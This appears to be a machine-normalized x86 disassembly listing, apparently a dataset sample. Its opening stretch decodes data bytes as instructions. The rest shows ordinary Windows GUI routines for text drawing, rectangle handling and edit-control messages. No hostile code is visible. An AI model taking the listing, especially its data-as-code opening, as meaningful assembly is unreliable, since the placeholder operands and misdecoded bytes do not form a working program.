add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dl
outsd
insd
add [ ecx + esi * 4 + 0x43 ] ah
add ah bh
jb r-xdata
inc eax
add al dl
mov ah 0x42
add [ edi ] al
or dl [ ebx + edx * 2 + 0x63 ]
jb r-xdata
add [ eax + ebp * 8 + 0x42 ] bh
add [ eax + ebp * 8 - 0x18efffbe ] ah
inc edx
add [ edi ] dh
inc edx
add [ edx ] cl
push esp
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
add [ eax ] bl
test [ ebx ] al
sbb ah ah
inc edx
add al cl
xchg [ ebx ] eax
int3
add [ edx ] cl
arpl [ eax + eax + 0xa ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
add [ eax - 0x4d ] bl
inc ebx
add [ eax - 0x50 ] dh
inc ebx
add [ edi + 0x3d200043 ] bl
inc ebx
add [ ebp * 2 + 0x6d600043 ] dh
inc ebx
add [ eax + 0x48 ] ah
inc ebx
add [ eax - 0x13ffbcc2 ] bl
dec ecx
inc ebx
add [ ecx + ecx * 2 + 0x43 ] ah
add [ eax + 0x4c ] bh
inc ebx
add [ ebx + ecx * 2 ] ah
inc ebx
add [ eax - 0x2fffbc43 ] ch
test [ ebx ] eax
sub al 0x40
insb
push esp
jb r-xdata
hlt
add [ eax ] 0x0
add [ eax + 0x4208000d ] al
insb
insb
inc edx
popad
jb r-xdata
arpl [ ebx + 0x5 ] bp
add bh bh
jl r-xdata
mov bl 0x42
add [ edx + edx ] ch
inc ebx
add [ ecx ] dh
add [ eax ] cl
push ebx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b000e ] al
outsd
outsb
jae r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x7065646f
inc [ edx ]
je r-xdata
inc edx
inc ebx
je r-xdata
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al [ eax ]
or [ edx + esi * 2 + 0x61 ] al
dec ebp
outsd
add [ gs : eax ] dl
jb r-xdata
outsd
insb
jae r-xdata
adc [ eax ] al
inc ebx
push 0x65676e61
cmp al 0x10
inc eax
add [ edx + eax ] dl
add bh bh
cld
out 0x42 al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and [ eax + eax ] 0x0
push ss
add [ ebx ] al
dec ebp
popad
js r-xdata
adc [ eax ] eax
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp - 0x2f00ffff ] ah
mov bl 0x43
add ah dh
mov bl 0x43
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4305000f ] al
je r-xdata
add [ eax ] al
jmp esp
add [ eax + 0x5b0042f7 ] ah
add [ eax ] al
jmp [ edi + edi + 0x10043 ]
pushad
add [ eax ] al
[ eax + eax ]
push ebx
imul edi [ edx + 0x65 ] r-xdata
adc [ eax ] al
adc [ edx ] al
add bh bh
in al 0xe6
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop ss
add [ ebx ] al
dec ebp
imul ebp [ esi + 0x3c ] 0x18004010
add al [ eax ]
dec [ esi + 0x10042 ]
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb [ eax ] al
or [ eax + 0x61 ] dl
push ebx
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
inc ah
push 0x43
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc eax [ eax ]
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
add al 0x93
inc esp
add [ eax ] cl
add al [ eax ]
add [ gs : eax ] dl
xor eax [ eax + ecx * 4 - 0x9 ]
inc edx
add [ edx ] bh
add bh bh
jpe r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
adc [ eax ] al
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
push esp
in al 0x42
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al 0x0
add al 0x4b
imul ebp [ esi + 0x64 ] r-xdata
and al [ edx ]
add bh bh
and al [ edx ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
adc eax 0x614c0b00
jb r-xdata
jae r-xdata
add bh bh
hlt
jb r-xdata
inc edx
add [ ebp ] bl
inc [ edx ]
fwait
add [ eax ] al
[ ebx + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sub_42bb3c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_43cef4
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0xb9
mov eax esi
call sub_43424c
mov edx 0x69
mov eax esi
call sub_434270
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403404
mov eax esi
pop esi
pop ebx
retn
call sub_40345c
pop [ fs : 0x0 ]
add esp 0xc
sub_42bb98
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4372fc
mov edx [ ebx + 0x68 ]
mov eax [ ebx + 0x208 ]
call sub_41dadc
mov edx r-xdata
mov eax [ ebx + 0x208 ]
call sub_41da38
add [ esi + 0x4 ] eax
push 0xffffffff
push 0xffffffff
push esi
call InflateRect
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
pop esi
pop ebx
retn
push 0xffffffff
push 0xffffffff
push esi
call InflateRect
sub_42bc04
push ebp
mov ebp esp
mov ecx 0x11
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_42bfa6
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebx + 0x208 ]
mov edx [ ebx + 0x68 ]
mov eax edi
call sub_41dadc
call sub_4279c8
call sub_427aa8
test al al
je r-xdata
mov edx r-xdata
mov eax edi
call sub_41da38
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x4c ]
push eax
lea eax [ ebp - 0x1d ]
push eax
mov edx [ ebp - 0x4 ]
sar edx 0x1
jns r-xdata
lea edx [ ebp - 0x50 ]
mov eax ebx
call sub_434a90
cmp [ ebp - 0x50 ] 0x0
je r-xdata
dec edx
mov ecx [ ebx + 0x48 ]
xor eax eax
call sub_4125c0
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
adc edx 0x0
push 0x0
lea eax [ ebp - 0x2d ]
push eax
xor ecx ecx
xor edx edx
xor eax eax
call sub_4125c0
lea eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x54 ]
mov eax ebx
call sub_434a90
mov eax [ ebp - 0x54 ]
call sub_404174
push eax
lea edx [ ebp - 0x58 ]
mov eax ebx
call sub_434a90
mov eax [ ebp - 0x58 ]
call sub_404374
push eax
mov eax edi
call sub_41dbbc
push eax
call GetTextExtentPoint32A
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x2d ]
push eax
mov ecx [ ebp - 0xc ]
xor edx edx
xor eax eax
call sub_4125c0
mov eax ebx
mov si 0xffc8
call sub_4032f4
test al al
jne r-xdata
mov edx 0xff000006
mov eax [ edi + 0x14 ]
call sub_41d4f4
inc [ ebp - 0x1d ]
inc [ ebp - 0x19 ]
mov edx 0xff000014
mov eax [ edi + 0x14 ]
call sub_41d4f4
lea edx [ ebp - 0x1d ]
mov eax edi
call sub_41d8d4
push 0xffffffff
push 0xffffffff
lea eax [ ebp - 0x1d ]
push eax
call OffsetRect
mov edx 0xff000010
mov eax [ edi + 0x14 ]
call sub_41d4f4
jmp r-xdata
mov [ ebp - 0x39 ] eax
mov eax [ ebp - 0x21 ]
push eax
mov eax [ ebp - 0x25 ]
push eax
mov eax [ ebp - 0x29 ]
push eax
mov eax [ ebp - 0x2d ]
push eax
mov eax edi
call sub_41dbbc
push eax
call ExcludeClipRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
adc eax 0x0
push 0x0
mov eax [ ebx + 0x48 ]
sub eax 0x8
sub eax [ ebp - 0x25 ]
push eax
lea eax [ ebp - 0x2d ]
push eax
call OffsetRect
jmp r-xdata
push 0x0
push 0x8
lea eax [ ebp - 0x2d ]
push eax
call OffsetRect
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42bfad
lea eax [ ebp - 0x8c ]
mov edx 0x5
call sub_403ed8
lea eax [ ebp - 0x68 ]
mov edx 0x2
call sub_403ed8
lea eax [ ebp - 0x60 ]
call sub_404594
lea eax [ ebp - 0x5c ]
mov edx 0x4
call sub_403ed8
retn
mov eax ebx
mov si 0xffc8
call sub_4032f4
test al al
jne r-xdata
lea edx [ ebp - 0x1d ]
mov eax edi
call sub_41d8d4
lea edx [ ebp - 0x68 ]
mov eax ebx
call sub_434a90
cmp [ ebp - 0x68 ] 0x0
je r-xdata
mov [ ebp - 0xd ] 0x1c
mov [ ebp - 0xd ] 0x1b
jmp r-xdata
lea edx [ ebp - 0x3d ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x21 ]
sub eax [ ebp - 0x29 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x78 ]
push eax
lea edx [ ebp - 0x7c ]
mov eax ebx
call sub_434a90
mov edx [ ebp - 0x7c ]
mov eax [ ebx + 0x208 ]
call sub_41da1c
push eax
mov eax [ ebp - 0x15 ]
pop edx
sub eax edx
sub eax 0x8
xor ecx ecx
xor edx edx
call sub_4125c0
push edi
lea esi [ ebp - 0x78 ]
lea edi [ ebp - 0x1d ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x1d ]
push eax
xor ecx ecx
xor edx edx
mov eax 0x8
call sub_4125c0
jmp r-xdata
lea edx [ ebp - 0x64 ]
mov eax ebx
call sub_434a90
mov edx [ ebp - 0x64 ]
lea eax [ ebp - 0x60 ]
call sub_4046e0
mov eax [ ebp - 0x60 ]
push eax
lea eax [ ebp - 0x2d ]
push eax
push 0x0
push 0x0
mov eax edi
call sub_41dbbc
push eax
call sub_4279c8
lea ecx [ ebp - 0x4c ]
pop edx
call sub_427c10
jmp r-xdata
call sub_4279c8
lea ecx [ ebp - 0x4c ]
mov dl [ ebp - 0xd ]
call sub_427c74
lea eax [ ebp - 0x3d ]
push eax
push 0x0
mov eax edi
call sub_41dbbc
push eax
call sub_4279c8
lea ecx [ ebp - 0x4c ]
pop edx
call sub_427b64
push 0x0
mov eax edi
call sub_41dbbc
push eax
call SelectClipRgn
lea edx [ ebp - 0x5c ]
mov eax ebx
call sub_434a90
cmp [ ebp - 0x5c ] 0x0
je r-xdata
mov edx 0x20
mov eax ebx
call sub_436d88
mov esi eax
mov eax esi
or eax 0x400
push eax
lea eax [ ebp - 0x1d ]
push eax
lea edx [ ebp - 0x80 ]
mov eax ebx
call sub_434a90
mov eax [ ebp - 0x80 ]
call sub_404174
push eax
lea edx [ ebp - 0x84 ]
mov eax ebx
call sub_434a90
mov eax [ ebp - 0x84 ]
call sub_404374
push eax
mov eax edi
call sub_41dbbc
push eax
call DrawTextA
mov edx [ ebx + 0x70 ]
mov eax [ edi + 0x14 ]
call sub_41d4f4
push esi
lea eax [ ebp - 0x1d ]
push eax
lea edx [ ebp - 0x88 ]
mov eax ebx
call sub_434a90
mov eax [ ebp - 0x88 ]
call sub_404174
push eax
lea edx [ ebp - 0x8c ]
mov eax ebx
call sub_434a90
mov eax [ ebp - 0x8c ]
call sub_404374
push eax
mov eax edi
call sub_41dbbc
push eax
call DrawTextA
sub_42bfb7
inc [ ecx ]
add [ eax ] al
add [ eax ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_42c032
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_434a90
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_44b6ac
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_43a714
mov eax ebx
mov si 0xffb8
call sub_4032f4
test al al
je r-xdata
mov eax ebx
call sub_43b7f0
mov [ edi + 0xc ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c039
lea eax [ ebp - 0x4 ]
call sub_403eb4
retn
sub_42c084
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_43c4b8
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0x41
mov eax esi
call sub_43424c
mov edx 0x11
mov eax esi
call sub_434270
mov [ esi + 0x16d ] 0x1
mov [ esi + 0x170 ] 0x1
call sub_4279c8
call sub_427aa8
test al al
je r-xdata
add esp 0xfffffff0
call sub_403404
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_40345c
pop [ fs : 0x0 ]
add esp 0xc
mov eax esi
test bl bl
je r-xdata
sub_42c130
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_42c286
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x90 ]
test esi 0x400
je r-xdata
cmp [ ebx + 0x170 ] 0x0
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_436d88
mov esi eax
mov edx [ ebx + 0x68 ]
mov eax [ ebx + 0x160 ]
call sub_41dadc
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
or esi 0x800
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_40417c
cmp [ ebx + 0x170 ] 0x0
je r-xdata
push esi
push edi
mov eax [ ebp - 0x4 ]
call sub_404174
push eax
mov eax [ ebp - 0x4 ]
call sub_404374
push eax
mov eax [ ebx + 0x160 ]
call sub_41dbbc
push eax
call DrawTextA
push 0x1
push 0x1
push edi
call OffsetRect
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_41cd28
push esi
push edi
mov eax [ ebp - 0x4 ]
call sub_404174
push eax
mov eax [ ebp - 0x4 ]
call sub_404374
push eax
mov eax [ ebx + 0x160 ]
call sub_41dbbc
push eax
call DrawTextA
push 0xffffffff
push 0xffffffff
push edi
call OffsetRect
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0xc ]
mov edx 0xff000010
call sub_41cd28
push esi
push edi
mov eax [ ebp - 0x4 ]
call sub_404174
push eax
mov eax [ ebp - 0x4 ]
call sub_404374
push eax
mov eax [ ebx + 0x160 ]
call sub_41dbbc
push eax
call DrawTextA
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x26
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c28d
lea eax [ ebp - 0x4 ]
call sub_403eb4
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1 ] 0x0
jne r-xdata
sub_42c297
inc [ ecx ]
add [ eax ] al
add [ eax ] ah
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
add esp 0xffffffd0
mov ebx eax
mov esi [ ebx + 0x160 ]
mov eax ebx
call sub_42c4c0
test al al
jne r-xdata
mov dl 0x1
mov eax [ esi + 0x14 ]
call sub_41d610
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
xor eax eax
mov al [ ebx + 0x16f ]
mov di [ eax * 2 + rw-data ]
or di 0x40
xor eax eax
mov al [ ebx + 0x16c ]
or di [ eax * 2 + rw-data ]
movzx edi di
cmp [ ebx + 0x16e ] 0x0
je r-xdata
mov edx [ ebx + 0x70 ]
mov eax [ esi + 0x14 ]
call sub_41d4f4
xor edx edx
mov eax [ esi + 0x14 ]
call sub_41d610
lea edx [ esp + 0x20 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ esp + 0x20 ]
mov eax esi
call sub_41d898
mov edx esp
mov ecx edi
mov eax ebx
mov si 0xffc6
call sub_4032f4
add esp 0x30
pop edi
pop esi
pop ebx
retn
push edi
lea esi [ esp + 0x4 ]
lea edi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov ecx edi
or ecx 0x400
lea edx [ esp + 0x10 ]
mov eax ebx
mov si 0xffc6
call sub_4032f4
cmp [ ebx + 0x16e ] 0x2
jne r-xdata
mov eax [ ebx + 0x4c ]
sub eax [ esp + 0x1c ]
sar eax 0x1
jns r-xdata
mov eax [ ebx + 0x4c ]
sub eax [ esp + 0x1c ]
push eax
push 0x0
lea eax [ esp + 0x8 ]
push eax
call OffsetRect
jmp r-xdata
push eax
push 0x0
lea eax [ esp + 0x8 ]
push eax
call OffsetRect
adc eax 0x0
sub_42c3b8
push ebx
push esi
push edi
add esp 0xffffffec
mov edi eax
test [ edi + 0x1c ] 0x2
jne r-xdata
add esp 0x14
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x16d ] 0x0
je r-xdata
lea edx [ esp + 0x1 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x44 ]
push 0x0
call GetDC
mov ebx eax
mov edx ebx
mov eax [ edi + 0x160 ]
call sub_41dc3c
xor eax eax
mov al [ edi + 0x16f ]
mov cx [ eax * 2 + rw-data ]
or cx 0x440
movzx ecx cx
lea edx [ esp + 0x1 ]
mov eax edi
mov si 0xffc6
call sub_4032f4
xor edx edx
mov eax [ edi + 0x160 ]
call sub_41dc3c
push ebx
push 0x0
call ReleaseDC
mov ebx [ edi + 0x40 ]
mov al [ edi + 0x16c ]
mov [ esp ] al
mov eax edi
mov si 0xffc8
call sub_4032f4
test al al
je r-xdata
cmp [ esp ] 0x1
jne r-xdata
mov eax esp
call sub_431870
mov eax [ esp + 0x9 ]
push eax
mov eax [ esp + 0x11 ]
push eax
mov ecx [ edi + 0x44 ]
mov edx ebx
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ edi + 0x48 ]
sub eax [ esp + 0x9 ]
add ebx eax
sub_42c4fc
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_42c4c0
cmp bl al
je r-xdata
mov [ esi + 0x188 ] 0x1
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_42c55c
push esi
push edi
mov edi eax
cmp dl [ edi + 0x16f ]
je r-xdata
pop edi
pop esi
retn
mov [ edi + 0x16f ] dl
mov eax edi
mov si 0xffc7
call sub_4032f4
mov eax edi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_42c584
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_433f60
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x168 ]
jne r-xdata
xor eax eax
mov [ edi + 0x168 ] eax
sub_42c5e8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_42c675
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x168 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c67c
lea eax [ ebp - 0x4 ]
call sub_403eb4
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
cmp [ ebx + 0x170 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_434a90
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_44b6ac
test al al
je r-xdata
mov ebx [ ebx + 0x168 ]
mov eax ebx
mov si 0xffb8
call sub_4032f4
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
mov [ edi + 0xc ] 0x1
sub_42c6cc
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_436fbc
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403404
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_40345c
pop [ fs : 0x0 ]
add esp 0xc
mov edx 0x79
mov eax esi
call sub_43424c
mov edx 0x19
mov eax esi
call sub_434270
mov dl 0x1
mov eax esi
call sub_43b4c4
xor edx edx
mov eax esi
call sub_434c54
mov [ esi + 0x20c ] 0x1
mov [ esi + 0x20f ] 0x1
mov [ esi + 0x210 ] 0x1
mov [ esi + 0x211 ] 0x1
mov eax esi
call sub_42cd40
mov eax esi
test bl bl
je r-xdata
sub_42c774
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0xc5
mov eax ebx
call sub_43b290
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_42c7e0
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x208 ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x208 ] esi
mov eax ebx
call sub_43b594
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xc8 ]
sub_42c824
push ebx
push esi
mov esi eax
mov bl [ esi + 0x215 ]
mov eax esi
call sub_43b594
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0xb8
mov eax esi
call sub_43b290
push eax
call SendMessageA
test eax eax
setne bl
sub_42c85c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_43b594
test al al
je r-xdata
mov [ esi + 0x215 ] bl
pop esi
pop ebx
retn
push 0x0
xor eax eax
mov al bl
push eax
push 0xb9
mov eax esi
call sub_43b290
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_42c894
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x20e ]
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x20e ] bl
mov eax esi
call sub_43b594
test al al
je r-xdata
push 0x0
xor eax eax
mov al bl
push eax
push 0xcf
mov eax esi
call sub_43b290
push eax
call SendMessageA
sub_42c8d0
push ebx
push ecx
mov ebx eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0xb0
mov eax ebx
call sub_43b290
push eax
call SendMessageA
mov eax [ esp ]
pop edx
pop ebx
retn
sub_42c8f4
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push esi
push 0xb1
mov eax ebx
call sub_43b290
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_42c914
push ebx
add esp 0xfffffff8
mov ebx eax
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push 0xb0
mov eax ebx
call sub_43b290
push eax
call SendMessageA
mov eax [ esp + 0x4 ]
sub eax [ esp ]
pop ecx
pop edx
pop ebx
retn
sub_42c944
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push 0xb0
mov eax ebx
call sub_43b290
push eax
call SendMessageA
add esi [ esp ]
mov [ esp + 0x4 ] esi
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
push 0xb1
mov eax ebx
call sub_43b290
push eax
call SendMessageA
push 0x0
push 0x0
push 0xb7
mov eax ebx
call sub_43b290
push eax
call SendMessageA
pop ecx
pop edx
pop esi
pop ebx
retn
sub_42c9e0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd0 ]
mov esi eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov [ ebp - 0x8 ] eax
mov eax ebx
call sub_434a04
inc eax
call sub_4085d0
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_42ca6a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_4085e4
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_434a14
cmp edi [ ebp - 0x8 ]
jg r-xdata
mov edx [ ebp - 0xc ]
add edx esi
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_408434
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ca71
mov eax [ ebp - 0xc ]
call sub_40861c
retn
dec edi
mov [ ebp - 0x8 ] edi
sub_42ca7c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd0 ]
mov [ ebp - 0x8 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov esi eax
mov eax edi
mov ecx esi
xor edx edx
call sub_403fa4
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax ebx
call sub_434a04
inc eax
call sub_4085d0
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42cb0a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4085e4
mov ecx eax
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_434a14
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
add eax edx
mov edx [ edi ]
mov ecx esi
call sub_4028c8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_40861c
retn
sub_42cb18
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43811c
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_438048
mov eax [ esi + 0x4 ]
or eax 0xc0
xor edx edx
mov dl [ ebx + 0x20c ]
or eax [ edx * 4 + rw-data ]
cmp [ ebx + 0x20d ] 0x0
setne dl
and edx 0x7f
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x20e ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x213 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x211 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x212 ]
or eax [ edx * 4 + rw-data ]
mov [ esi + 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x20c ] 0x1
jne r-xdata
and [ esi + 0x4 ] 0xff7fffff
or [ esi + 0x8 ] 0x200
sub_42cbd1
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
add esp 0xffffff74
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax ebx
call sub_438418
mov eax [ rw-data ]
cmp [ eax ] 0x2
je r-xdata
test [ edx + 0x5 ] 0x8
je r-xdata
mov esi edx
mov edi esp
mov ecx 0x23
[ edi ] [ esi ]
and [ esp + 0x4 ] 0xfffff7ff
mov edx esp
mov eax ebx
call sub_438418
mov eax [ ebx + 0x180 ]
test eax eax
je r-xdata
add esp 0x8c
pop edi
pop esi
pop ebx
retn
push 0x0
push 0x1
push 0xcf
push eax
call SendMessageA
jmp r-xdata
sub_42cc44
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x214 ] 0x1
xor eax eax
push ebp
push sub_42cc83
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_438248
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42cc8a
mov eax [ ebp - 0x4 ]
mov [ eax + 0x214 ] 0x0
retn
sub_42cc8a
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x208 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc8 ]
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x215 ]
mov eax [ ebp - 0x4 ]
call sub_42c85c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20d ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_42cd04
pop ecx
